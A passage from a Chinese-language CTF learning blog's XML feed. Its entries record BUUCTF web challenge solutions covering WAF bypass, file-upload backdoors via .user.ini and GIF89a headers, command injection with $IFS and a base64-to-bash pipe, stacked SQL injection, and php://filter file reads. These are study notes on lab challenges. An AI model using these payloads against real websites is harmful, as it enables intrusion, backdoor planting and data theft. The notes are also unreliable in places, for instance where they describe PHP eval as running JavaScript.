href="https://blog.csdn.net/Obs_cure/article/details/113805070">具体做法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过做题记录1</title>
      <link href="/2023/07/12/WAF%E7%BB%95%E8%BF%87%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2023/07/12/WAF%E7%BB%95%E8%BF%87%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<h1 id="WAF绕过专题"><a href="#WAF绕过专题" class="headerlink" title="WAF绕过专题"></a>WAF绕过专题</h1><hr><ul><li>ps：作为一题比较基础的waf绕过需要记录一下，在sqli-labs里没有好好研究</li></ul><p>WAF，全称：Web Application Firewall ，译为Web应用防护墙。WAF是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品，主要用于防御针对网络应用层的攻击，像SQL注入、跨站脚本攻击、参数篡改、应用平台漏洞攻击、拒绝服务攻击等。</p><p><strong>WAF部署在web应用程序前面，在用户请求到达web服务器前对用户请求进行扫描和过滤</strong>，分析并校验每个用户请求的网络包，确保每个用户请求有效且安全，对无效或有攻击行为的请求进行阻断或隔离。通过检查HTTP流量，可以防止源自web应用程序的安全漏洞（如SQL注入，跨站脚本攻击，文件包含和安全配置错误）的攻击。</p><hr><h3 id="0x01-RoarCTF-2019-Easy-Calc-1"><a href="#0x01-RoarCTF-2019-Easy-Calc-1" class="headerlink" title="0x01[RoarCTF 2019]Easy Calc 1"></a>0x01[RoarCTF 2019]Easy Calc 1</h3><hr><p>这题的主要原理是利用PHP的字符串解析特性绕过waf，附上<a href="https://blog.csdn.net/qq_45521281/article/details/105871192">解释</a>。</p><p>像这里的waf拦截了为字符值的num变量，绕过思路就是将在num加个空格让waf识别不出这个变量是num，它会认为‘ num’是另一个变量名并不在它的拦截名单里，从而实现绕过。然而php解释器会将空白符给过滤掉，以及进行一些字符变换，所以‘ num’还是会变成‘num’，不会影响代码运行<br>然后就是分析源码：（具体做法下方链接）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//获取num变量的值</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//判断num变量符不符合要求</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 判断绕过则执行非法代码，并打印在页面上</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>补充几个函数：</p><pre class="line-numbers language-none"><code class="language-none">foreach：foreach(array_expression as $value) statement 遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。        foreach(array_expression as $key &#x3D;&gt; $value) statement 第二种格式做同样的事，只是除了当前单元的值以外，键值也会在每次循环中被赋给变量 $key。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">eval()函数会将传入的字符串当做 JavaScript 代码进行执行。但是字符串必须以‘;’结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就是硬记函数payload：</p><pre class="line-numbers language-none"><code class="language-none">? num&#x3D;print_r(scandir(chr(47)));? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); print_r使结果以更容易理解的方式输出scandir：linux的命令函数，查看目录的file_get_contents：php函数用来打开指定文件的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/snowlyzz/article/details/123459590">参考链接</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> waf绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传做题记录1</title>
      <link href="/2023/07/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞专题"><a href="#文件上传漏洞专题" class="headerlink" title="文件上传漏洞专题"></a>文件上传漏洞专题</h1><hr><h2 id="0x01-极客大挑战-2019-Upload-1"><a href="#0x01-极客大挑战-2019-Upload-1" class="headerlink" title="0x01 [极客大挑战 2019]Upload 1"></a>0x01 [极客大挑战 2019]Upload 1</h2><p>这里只记录一个新的图片木马的写法：<br><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/1.png"><br><a href="https://blog.csdn.net/weixin_45253573/article/details/110867160">参考链接</a></p><h2 id="0x02-SUCTF-2019-CheckIn-1"><a href="#0x02-SUCTF-2019-CheckIn-1" class="headerlink" title="0x02 [SUCTF 2019]CheckIn 1"></a>0x02 [SUCTF 2019]CheckIn 1</h2><hr><p>记录一下.user.ini文件的用处，php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p><h4 id="两个配置项："><a href="#两个配置项：" class="headerlink" title="两个配置项："></a>两个配置项：</h4><pre class="line-numbers language-none"><code class="language-none">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;包含在文件头auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;包含在文件尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两个配置项的作用相当于一个文件包含，比如</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .user.iniauto_prepend_file &#x3D; 1.jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;&#x2F;&#x2F; 1.php(任意php文件)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句require(‘1.jpg’)，进行了文件包含。</p><h4 id="GIF89a图片头欺骗"><a href="#GIF89a图片头欺骗" class="headerlink" title="GIF89a图片头欺骗"></a>GIF89a图片头欺骗</h4><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。我们用GIF89a在文件开头，这个函数就会认为这个文件是个真正的图片，这样就不用去构造一个图片马。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。<br><a href="https://blog.csdn.net/cosmoslin/article/details/120793126">参考链接1</a><br><a href="https://blog.csdn.net/qq_36374896/article/details/107005123">参考链接2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> file upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入做题记录1</title>
      <link href="/2023/07/11/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/11/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="命令注入专题"><a href="#命令注入专题" class="headerlink" title="命令注入专题"></a>命令注入专题</h1><hr><h2 id="0x01-ACTF2020-新生赛-Exec-1（命令注入）"><a href="#0x01-ACTF2020-新生赛-Exec-1（命令注入）" class="headerlink" title="0x01 [ACTF2020 新生赛]Exec 1（命令注入）"></a>0x01 [ACTF2020 新生赛]Exec 1（命令注入）</h2><hr><pre class="line-numbers language-none"><code class="language-none">对于a &amp; b，既执行a的命令也执行b的命令，将任务置于后台执行；对于a &amp;&amp; b，在a执行成功的情况下执行b，a执行失败就不会执行b，和逻辑与一样；对于a | b，“|”为管道符，它将a执行的结果作为b的输入，因此无论a执行结果如何，都会执行b；对于a || b，在a执行失败的情况下执行b，a执行成功则不会执行b，和逻辑或一样；对于a;b，在Linux系统下会将a和b都执行，前面的执行完执行后面的；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是commend命令注入，在xss中有提到，这里实战还是记录一下过程：<br>1、先ping本地地址127.0.0.1，发现能成功<br>2、然后直接查目录：127.0.0.1&amp;ls，出现了index.php，访问一下把原页面刷新了一下没有东西<br>3、尝试linux系统，127.0.0.1&amp;ls &#x2F;，出现了许多文件看到了flag文件，在pwn里就是直接cat flag就好了但是……<br>4、在kali中相当于还没访问root总文件夹，需要127.0.0.1&amp;cat &#x2F;flag就成了<br>补充：<img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/2.png"><br><a href="https://blog.csdn.net/hintll/article/details/117907659">参考链接</a></p><h2 id="0x02-GXYCTF2019-Ping-Ping-Ping-1（命令注入）"><a href="#0x02-GXYCTF2019-Ping-Ping-Ping-1（命令注入）" class="headerlink" title="0x02 [GXYCTF2019]Ping Ping Ping 1（命令注入）"></a>0x02 [GXYCTF2019]Ping Ping Ping 1（命令注入）</h2><p>发现一个规律，这些题目都挺喜欢把flag放在php文件里并注释掉，这样就可以不让flag输出在网页上，而我们通常的思路都是要读源码就能找到这玩意，并且题目给的任何提示都是有用的比如这边的?ip&#x3D;就是叫我们用这个当做变量上传参数，以及后来的绕过啊什么的都有提示，并且这里又是linux的操作系统</p><p><strong>绕过空格的方法：</strong></p><pre class="line-numbers language-none"><code class="language-none">$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X&#x3D;$&#39;cat\x09.&#x2F;flag.php&#39;;$X       （\x09表示tab，也可以用\x20）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还涉及到一些知识比如这里的<strong>base64绕过</strong>命令：<code>?ip=127.0.0.1;echo$IFS$1&quot;Y2F0IGZsYWcucGhw&quot;|$IFS$1base64$IFS$1-d$IFS$1|$IFS$1bash</code>给出<a href="https://www.cnblogs.com/JasonCeng/p/15741335.html">文章</a>解释<br>还有这题大多数的解法变量绕过：<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code><br>并且还有不出现flag的方法绕过：?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code> <strong>使用 $IFS$9绕过空格，配合「反引号」的高优先级特性查看 flag.php 文件(将ls的结果当成cat的参数，那样就不用出现flag这个参数了)</strong> 这个ls是有带反引号的因为Markdown语法被识别成了代码<br><a href="https://blog.csdn.net/vanarrow/article/details/108295481">解题参考1</a><br><a href="https://www.cnblogs.com/LY613313/p/16186012.html">解题参考2</a><br>感谢老师傅的解答</p>]]></content>
      
      
      
        <tags>
            
            <tag> commend injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli注入做题记录1</title>
      <link href="/2023/07/11/sqli%E6%B3%A8%E5%85%A5%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/11/sqli%E6%B3%A8%E5%85%A5%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli注入专题"><a href="#sqli注入专题" class="headerlink" title="sqli注入专题"></a>sqli注入专题</h1><hr><h3 id="0x01-强网杯-2019-随便注-1（堆叠注入）"><a href="#0x01-强网杯-2019-随便注-1（堆叠注入）" class="headerlink" title="0x01 [强网杯 2019]随便注 1（堆叠注入）"></a>0x01 [强网杯 2019]随便注 1（堆叠注入）</h3><hr><p>ps：不是我就在想啊靶场是什么玩意啊<img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/3.jpg">，实战题都是什么牛马啊<img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/4.png">，我不理解并且大为震撼怎么会有这么多的注入姿势啊？？？<br>直接给出参考<a href="https://zhuanlan.zhihu.com/p/545713669">链接</a>这个最全了<br>四个方法：<br>1、预编译拼接法<br>2、预编译进制法<br>3、更改表名法<br>4、handle特殊法<br>解释都在链接里了</p><h3 id="0x02-SUCTF-2019-EasySQL-1（堆叠注入）"><a href="#0x02-SUCTF-2019-EasySQL-1（堆叠注入）" class="headerlink" title="0x02 [SUCTF 2019]EasySQL 1（堆叠注入）"></a>0x02 [SUCTF 2019]EasySQL 1（堆叠注入）</h3><hr><p>每个小白看完wp都会觉得离谱的猜测代码做法，代码拼接后的逻辑我理解，这里主要记录下这种注入语句：<code>select *,1||flag from Flag</code>,还有第二种堆叠注入的方法要设置参数，也记录一下</p><pre class="line-numbers language-none"><code class="language-none">sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>拼接完相当于select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag<br>具体做法看这篇<a href="https://blog.csdn.net/bring_coco/article/details/108737434">博客</a></p><h3 id="0x03-GXYCTF2019-BabySQli-1"><a href="#0x03-GXYCTF2019-BabySQli-1" class="headerlink" title="0x03 [GXYCTF2019]BabySQli 1"></a>0x03 [GXYCTF2019]BabySQli 1</h3><hr><ul><li>ps：这题蛮坑的，不看源码好难做啊，很多都过滤了页面没什么反应，连（）都过滤<del>丧心病狂</del></li></ul><h4 id="base32与base64编码的特点"><a href="#base32与base64编码的特点" class="headerlink" title="base32与base64编码的特点"></a>base32与base64编码的特点</h4><hr><pre class="line-numbers language-none"><code class="language-none">base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+&#x2F;，通常有两个&#x3D;；base32中只包含大写字母（A-Z）和数字234567，通常有或没有三个&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="联合注入的特性"><a href="#联合注入的特性" class="headerlink" title="联合注入的特性"></a>联合注入的特性</h4><hr><p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong>但是也是个临时数据，刷新后不会保存。<br>我们构造payload：<code>name=admin&#39; union select 1,&#39;admin&#39;,NULL#&amp;pw[]=123</code>这里会查询name&#x3D;admin和pw&#x3D;null的数据，但是数据库里很明显没有这样的数据，这时我们就可以临时创造<br>这样一个name&#x3D;admin和pw&#x3D;null的数据保存在数据库里，pw传一个数组md5加密会返回一个null就正好对应上了（当然不看源码我也不懂哪里有md5的提示）<br>关健代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>老朋友函数：</p><pre class="line-numbers language-none"><code class="language-none">mysqli_query(connection,query,resultmode);connection必需。规定要使用的 MySQL 连接。query        必需，规定查询字符串。resultmode可选。一个常量。可以是下列值中的任意一个：                MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）                MYSQLI_STORE_RESULT（默认）执行查找语句——————————————————————————————mysqli_fetch_row() 函数从结果集中取得一行，并作为枚举数组返回。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/m0_62879498/article/details/124141815">做题链接1</a><br><a href="https://blog.csdn.net/satasun/article/details/107180524">做题链接2</a></p><h3 id="0x04-GYCTF2020-Blacklist-1"><a href="#0x04-GYCTF2020-Blacklist-1" class="headerlink" title="0x04 [GYCTF2020]Blacklist 1"></a>0x04 [GYCTF2020]Blacklist 1</h3><hr><ul><li>ps：随便注的升级版<br>这题过滤了很多东西：<code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>把碰到这些关键词的背后也全部注释，这是个强过滤，注入基本不能用了，这种时候就要考虑到堆叠注入：<pre class="line-numbers language-none"><code class="language-none">show databases; 获取数据库名show tables from databases; 获取表名show columns from table_name; 获取列名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="handler语法"><a href="#handler语法" class="headerlink" title="handler语法"></a>handler语法</h4><hr><p><strong>句柄：句柄（Handle）是一个是用来标识对象或者项目的标识符，可以用来描述窗体、文件等。<br>翻译成白话就是，句柄 相当于一个指针，是一个广义的指针，不是特定指向某一个形式（整数、数组、对象等）。</strong><br>基本用法：</p><pre class="line-numbers language-none"><code class="language-none">1、打开句柄handler handler_table open;2、查看数据handler handler_table read first;handler handler_table read next;3、关闭句柄handler handler_table close;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过索引查看表:</p><pre class="line-numbers language-none"><code class="language-none">1、创建索引create index handler_index on handler_table(id);2、打开句柄handler handler_table open;# 打开句柄并命名为 phandler handler_table open as p;2(1)指定索引，例如：# 指定索引开始查看数据handler p read handler_index &#x3D; (2);3、查看数据# 获取第一行数据handler p read handler_index first;# 获取下一行数据handler p read handler_index next;# 获取上一行数据handler p read handler_index prev;# 获取最后一行数据handler p read handler_index last;4、关闭句柄handler p close;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_51927659/article/details/117233018">做题链接</a><br><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">handler语法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqli injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含做题记录1</title>
      <link href="/2023/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含专题"><a href="#文件包含专题" class="headerlink" title="文件包含专题"></a>文件包含专题</h1><hr><h3 id="0x01-ACTF2020-新生赛-Include-1（文件包含）"><a href="#0x01-ACTF2020-新生赛-Include-1（文件包含）" class="headerlink" title="0x01 [ACTF2020 新生赛]Include 1（文件包含）"></a>0x01 [ACTF2020 新生赛]Include 1（文件包含）</h3><hr><p>这题涉及到文件包含的小知识点</p><ul><li><p>php:&#x2F;&#x2F;filter与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。<br>所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p></li><li><p>php:&#x2F;&#x2F;filter 伪协议文件包含读取源代码，加上read&#x3D;convert.base64-encode，<br>用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。<br><img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/1.png"></p><pre class="line-numbers language-none"><code class="language-none">1、是格式2、是可选参数，有read和write，字面意思就是读和写3、是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）4、是必选参数，后面写你要处理的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样可以让源码以base64的编码输出出来，然后我们去解码就行了，<strong>最关键是思路：这里没有任何东西，只有一个flag.php文件，内容没有东西那就是源码了</strong><br><a href="https://blog.csdn.net/weixin_45642610/article/details/112427044">做题链接</a></p></li></ul><h3 id="0x02-极客大挑战-2019-Secret-File-1"><a href="#0x02-极客大挑战-2019-Secret-File-1" class="headerlink" title="0x02 [极客大挑战 2019]Secret File 1"></a>0x02 [极客大挑战 2019]Secret File 1</h3><hr><p>做个总结，如果网页没有什么信息就肯定在源代码里有提示，刚开始做题什么都是新鲜的。</p><h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><hr><ul><li><strong>定义：</strong>在 HTTP 协议中，重定向操作由服务器向请求发送特殊的重定向响应而触发。重定向响应包含以 3 开头的状态码，以及 Location 标头，其保存着重定向的 URL。浏览器在接收到重定向时，它们会立刻加载 Location 标头中提供的新 URL。除了额外的往返操作中会有一小部分性能损失之外，重定向操作对于用户来说是不可见的。</li></ul><p>我访问的明明是action.php但是加载出来的却是end.php,<strong>这种情况就要抓包，发送到repeater去看看有没有中间页面或文件，</strong>这里是有隐藏文件secr3t.php ，继续访问就会发现要用文件包含来做这题，但我刚开始就有试那个代码，我不理解为什么要在那串代码前面加上secr3t.php&#x2F;才可以，大概是secr3t.php里有include函数吧<br><a href="https://blog.csdn.net/qq_45766004/article/details/114947589">做题链接</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> file included </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题记录</title>
      <link href="/2023/07/10/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2023/07/10/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf刷题记录1："><a href="#buuctf刷题记录1：" class="headerlink" title="buuctf刷题记录1："></a>buuctf刷题记录1：</h1><hr><ul><li>ps：本来以为刷完靶场能会做一些题目，但是还是太天真了，题目和靶场压根不是一回事，道阻且长QAQ，还是继续做题吧……不过看起来pwn和web还是差很多的，如果pwn少写几步博客就完全看不懂，于是我决定从这篇博客开始我写的会稍微简单一点，但会在每题的后面附上做题完整链接，博客嘛主要是笔记作用,重在刷题和记思路。</li></ul><h2 id="0x01-ACTF2020-新生赛-Include-1（文件包含）"><a href="#0x01-ACTF2020-新生赛-Include-1（文件包含）" class="headerlink" title="0x01 [ACTF2020 新生赛]Include 1（文件包含）"></a>0x01 [ACTF2020 新生赛]Include 1（文件包含）</h2><hr><p>这题涉及到文件包含的小知识点</p><ul><li><p>php:&#x2F;&#x2F;filter与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。<br>所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p></li><li><p>php:&#x2F;&#x2F;filter 伪协议文件包含读取源代码，加上read&#x3D;convert.base64-encode，<br>用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。<br><img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/1.png"></p><pre class="line-numbers language-none"><code class="language-none">1、是格式2、是可选参数，有read和write，字面意思就是读和写3、是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）4、是必选参数，后面写你要处理的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样可以让源码以base64的编码输出出来，然后我们去解码就行了，<strong>最关键是思路：这里没有任何东西，只有一个flag.php文件，内容没有东西那就是源码了</strong><br><a href="https://blog.csdn.net/weixin_45642610/article/details/112427044">做题链接</a></p></li></ul><h2 id="0x02-ACTF2020-新生赛-Exec-1（命令注入）"><a href="#0x02-ACTF2020-新生赛-Exec-1（命令注入）" class="headerlink" title="0x02 [ACTF2020 新生赛]Exec 1（命令注入）"></a>0x02 [ACTF2020 新生赛]Exec 1（命令注入）</h2><hr><pre class="line-numbers language-none"><code class="language-none">对于a &amp; b，既执行a的命令也执行b的命令，将任务置于后台执行；对于a &amp;&amp; b，在a执行成功的情况下执行b，a执行失败就不会执行b，和逻辑与一样；对于a | b，“|”为管道符，它将a执行的结果作为b的输入，因此无论a执行结果如何，都会执行b；对于a || b，在a执行失败的情况下执行b，a执行成功则不会执行b，和逻辑或一样；对于a;b，在Linux系统下会将a和b都执行，前面的执行完执行后面的；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是commend命令注入，在xss中有提到，这里实战还是记录一下过程：<br>1、先ping本地地址127.0.0.1，发现能成功<br>2、然后直接查目录：127.0.0.1&amp;ls，出现了index.php，访问一下把原页面刷新了一下没有东西<br>3、尝试linux系统，127.0.0.1&amp;ls &#x2F;，出现了许多文件看到了flag文件，在pwn里就是直接cat flag就好了但是……<br>4、在kali中相当于还没访问root总文件夹，需要127.0.0.1&amp;cat &#x2F;flag就成了<br>补充：<img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/2.png"><br><a href="https://blog.csdn.net/hintll/article/details/117907659">链接</a></p><h2 id="0x03-GXYCTF2019-Ping-Ping-Ping-1（命令注入）"><a href="#0x03-GXYCTF2019-Ping-Ping-Ping-1（命令注入）" class="headerlink" title="0x03 [GXYCTF2019]Ping Ping Ping 1（命令注入）"></a>0x03 [GXYCTF2019]Ping Ping Ping 